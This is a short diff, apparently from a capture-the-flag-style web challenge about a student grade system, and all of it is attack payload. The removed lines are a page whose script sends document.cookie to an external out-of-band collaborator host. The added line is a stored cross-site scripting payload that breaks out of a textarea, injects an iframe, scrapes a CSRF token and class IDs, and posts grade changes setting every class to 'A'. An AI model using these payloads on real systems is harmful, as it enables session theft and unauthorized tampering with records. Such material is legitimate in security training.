@@ -1,10 +1,1 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Grade Change</title>
-</head>
-<body>
-    <h1>Loading...</h1>
-   <script>fetch('https://lh6n8xacxr7z5tg0u4jdsvhig9m7azyo.oastify.com/?leak='+document.cookie)</script>
-</body>
-</html>
+</textarea><iframesrcdoc='<scriptsrc="data:text/javascript,(async function() { try { const studentId = window.parent.location.pathname.split("/")[2]; console.log("Student ID:", studentId); const gradeChangeResp = await fetch("/grade-change"); const gradeChangeHtml = await gradeChangeResp.text(); const csrfMatch = gradeChangeHtml.match(/name="csrf_token" value="([^"]+)"/); if (!csrfMatch) { console.log("No CSRF token found"); return; } const csrfToken = csrfMatch[1]; console.log("CSRF token:", csrfToken); const dashboardResp = await fetch("/dashboard/" + studentId); const dashboardHtml = await dashboardResp.text(); const classIdMatches = [...dashboardHtml.matchAll(/<td>([a-f0-9-]{36})<\/td>/g)]; const classIds = classIdMatches.map(m => m[1]); console.log("Class IDs found:", classIds); if (classIds.length === 0) { console.log("No class IDs found"); return; } for (const classId of classIds) { const formData = new FormData(); formData.append("student_id", studentId); formData.append("class_id", classId); formData.append("grade", "A"); formData.append("csrf_token", csrfToken); const response = await fetch("/grade-change", { method: "POST", body: formData }); console.log(`Grade change for class ${classId}:`, response.status); await new Promise(resolve => setTimeout(resolve, 100)); } console.log("All grades updated to A!"); setTimeout(() => { window.parent.location.href = "/honor-roll-certificate"; }, 1000); } catch (error) { console.error("Exploit failed:", error); } })();"></script>'></iframe></textarea>
